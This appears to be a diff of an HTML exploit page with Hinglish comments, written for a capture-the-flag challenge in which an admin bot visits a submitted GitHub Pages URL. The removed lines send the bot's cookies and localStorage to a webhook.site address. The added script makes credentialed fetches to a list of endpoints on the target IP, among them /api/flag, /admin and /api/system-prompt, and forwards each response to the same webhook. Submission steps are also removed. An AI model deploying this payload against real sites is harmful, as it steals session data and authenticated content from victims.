@@ -4,45 +4,44 @@
 <script>
 var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
 
-// Bot ke cookies bhejo
-fetch(w + '?c=' + encodeURIComponent(document.cookie));
+// Bot ke saath CTF API call - same origin isliye credentials bhi jayenge
+var apis = [
+  '/api/drawings',
+  '/api/flag',
+  '/flag',
+  '/admin',
+  '/api/admin',
+  '/api/profile',
+  '/api/bot',
+  '/api/me',
+  '/api/user',
+  '/api/secret',
+  '/api/llm-context',
+  '/api/system-prompt',
+  '/api/config'
+];
 
-// localStorage bhejo
-fetch(w + '?ls=' + encodeURIComponent(JSON.stringify(localStorage)));
-
-// CTF API call with credentials (bot ke session ke saath)
-var x = new XMLHttpRequest();
-x.open('GET', 'http://151.115.166.43:17947/api/drawings', true);
-x.withCredentials = true;
-x.onload = function() {
-  fetch(w + '?drawings=' + encodeURIComponent(x.responseText));
-};
-x.send();
-
-// Internal flag endpoint try karo
-var endpoints = ['/flag', '/api/flag', '/secret', '/api/secret', '/admin'];
-endpoints.forEach(function(ep) {
-  var r = new XMLHttpRequest();
-  r.open('GET', 'http://151.115.166.43:17947' + ep, true);
-  r.withCredentials = true;
-  r.onload = function() {
-    fetch(w + '?ep=' + encodeURIComponent(ep) + '&res=' + encodeURIComponent(r.responseText));
-  };
-  r.send();
+apis.forEach(function(ep) {
+  fetch('http://151.115.166.43:17947' + ep, {
+    credentials: 'include',
+    mode: 'cors'
+  })
+  .then(function(r) {
+    return r.text().then(function(text) {
+      fetch(w + '?status=' + r.status + '&ep=' + encodeURIComponent(ep) + '&d=' + encodeURIComponent(text.substring(0, 500)));
+    });
+  })
+  .catch(function(e) {
+    // CORS blocked - try no-cors to at least confirm existence
+    fetch('http://151.115.166.43:17947' + ep, {mode: 'no-cors', credentials: 'include'})
+      .then(function() {
+        fetch(w + '?nocors_ok=' + encodeURIComponent(ep));
+      })
+      .catch(function() {
+        fetch(w + '?blocked=' + encodeURIComponent(ep));
+      });
+  });
 });
 </script>
 </body>
 </html>
-```
-
-> **Webhook ID already pata hai tere se** — `3ebc554f-f359-45f5-9b7f-d60cd8539ca8` use kar raha hoon
-
-### Step 2 — Commit karo
-- "Commit changes" click karo
-
-### Step 3 — 2 minute wait karo (GitHub Pages deploy hone mein lagta hai)
-
-### Step 4 — CTF mein submit karo
-`http://151.115.166.43:17947/link-submission` pe jao aur ye URL submit karo:
-```
-https://viveksharma-cs.github.io/ctf/
